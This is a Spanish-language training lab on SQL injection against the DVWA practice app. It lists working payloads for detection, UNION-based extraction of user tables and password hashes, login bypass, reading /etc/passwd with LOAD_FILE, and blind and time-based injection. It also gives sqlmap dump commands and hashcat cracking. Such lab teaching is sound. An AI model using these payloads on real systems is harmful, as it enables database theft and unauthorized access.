# Lab 02 — SQL Injection

## Objetivo

Comprender y explotar vulnerabilidades de inyección SQL: extracción de datos, bypass de autenticación y escalada a lectura de archivos del sistema.

**App objetivo:** DVWA → SQL Injection (Security: Low → Medium → High)

---

## Conceptos

SQL Injection ocurre cuando la entrada del usuario se concatena directamente en una query SQL sin sanitizar:

```php
// VULNERABLE
$query = "SELECT * FROM users WHERE id = '$user_input'";

// Si user_input = ' OR '1'='1
// Query resultante:
SELECT * FROM users WHERE id = '' OR '1'='1'
-- Devuelve TODOS los registros
```

---

## Parte 1 — Detectar la vulnerabilidad

En DVWA → SQL Injection, ingresa en el campo **User ID**:

```sql
'                          -- comilla sencilla → error SQL
''                         -- dos comillas → sin error
' OR '1'='1               -- siempre verdadero
' OR '1'='2               -- siempre falso (resultado vacío)
1 AND 1=1                 -- sin comillas (numérico)
1 AND 1=2                 -- retorna vacío
```

Un error como `You have an error in your SQL syntax` confirma la vulnerabilidad.

---

## Parte 2 — Extracción de datos (UNION-based)

### Paso 1 — Determinar número de columnas

```sql
' ORDER BY 1--+
' ORDER BY 2--+
' ORDER BY 3--+    ← error = hay 2 columnas
```

### Paso 2 — Identificar columnas visibles

```sql
' UNION SELECT NULL, NULL--+
' UNION SELECT 1, 2--+
```

Observa cuál número aparece en la respuesta — esa columna muestra datos.

### Paso 3 — Extraer información de la base de datos

```sql
-- Versión del servidor
' UNION SELECT 1, @@version--+

-- Base de datos actual
' UNION SELECT 1, database()--+

-- Usuario de MySQL
' UNION SELECT 1, user()--+

-- Listar todas las bases de datos
' UNION SELECT 1, GROUP_CONCAT(schema_name) FROM information_schema.schemata--+

-- Listar tablas de 'dvwa'
' UNION SELECT 1, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='dvwa'--+

-- Listar columnas de la tabla 'users'
' UNION SELECT 1, GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--+

-- Extraer usuarios y contraseñas
' UNION SELECT user, password FROM users--+
```

### Paso 4 — Crackear los hashes MD5

```bash
# Los hashes extraídos son MD5
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# O usar CrackStation online
# https://crackstation.net/
```

---

## Parte 3 — Bypass de autenticación

En un formulario de login:

```sql
-- Campo username:
admin'--
admin'#
' OR '1'='1'--
' OR 1=1--
admin' OR '1'='1

-- Resultado: la query queda:
SELECT * FROM users WHERE username='admin'--' AND password='...'
-- El '--' comenta el resto → acceso sin contraseña
```

---

## Parte 4 — Lectura de archivos (FILE)

```sql
-- Leer /etc/passwd (si el usuario MySQL tiene FILE privilege)
' UNION SELECT 1, LOAD_FILE('/etc/passwd')--+

-- Leer el código fuente de la app
' UNION SELECT 1, LOAD_FILE('/var/www/html/vulnerabilities/sqli/source/low.php')--+
```

---

## Parte 5 — SQLMap (automatizado)

```bash
# Capturar la petición con Burp → Save item → sqli_request.txt
# Contenido de sqli_request.txt:
# GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
# Host: localhost:8080
# Cookie: PHPSESSID=xxx; security=low

# Lanzar SQLMap
sqlmap -r sqli_request.txt --dbs
sqlmap -r sqli_request.txt -D dvwa --tables
sqlmap -r sqli_request.txt -D dvwa -T users --dump

# Directamente con URL
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
    --cookie="PHPSESSID=xxx; security=low" \
    --dbs --batch
```

---

## Parte 6 — SQLi Blind

Cuando la aplicación no muestra el resultado directo (solo "existe" o "no existe"):

```sql
-- Boolean-based blind
' AND 1=1--+    ← respuesta normal
' AND 1=2--+    ← respuesta diferente (usuario existe pero condición falsa)

-- Extraer datos carácter a carácter
' AND SUBSTRING(database(),1,1)='d'--+
' AND SUBSTRING(database(),2,1)='v'--+

-- Time-based blind (la app no cambia la respuesta)
' AND SLEEP(5)--+         ← retraso de 5s = vulnerable
' AND IF(1=1,SLEEP(5),0)--+
```

SQLMap detecta y explota blind automáticamente:

```bash
sqlmap -u "..." --technique=B    # Boolean-based
sqlmap -u "..." --technique=T    # Time-based
```

---

## Escalada de dificultad DVWA

| Security | Protección añadida | Bypass |
|----------|-------------------|--------|
| Low | Ninguna | Directo |
| Medium | `mysql_real_escape_string()` | Numérico sin comillas |
| High | Límite de 1 resultado | UNION sigue funcionando |

```sql
-- Medium (numérico, sin comillas)
1 UNION SELECT 1,database()#

-- High (en un campo de sesión separado)
1' UNION SELECT 1,@@version#
```

---

## Actividades

1. Confirmar SQLi en DVWA con `'` y analizar el error
2. Extraer todos los usuarios y hashes de la tabla `users`
3. Crackear al menos 3 hashes obtenidos
4. Leer el archivo `/etc/passwd` del servidor
5. Repetir con SQLMap y comparar resultados
6. Intentar en Security: Medium y documentar las diferencias

---

## Mapeo MITRE ATT&CK

| Técnica | TTP |
|---------|-----|
| SQL Injection | T1190 — Exploit Public-Facing Application |
| Credential Dumping (DB) | T1003 |
| File Read (LOAD_FILE) | T1005 — Data from Local System |

---

## Referencias

- [PortSwigger SQLi Lab](https://portswigger.net/web-security/sql-injection)
- [SQLMap Docs](https://sqlmap.org/)
- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PayloadsAllTheThings — SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
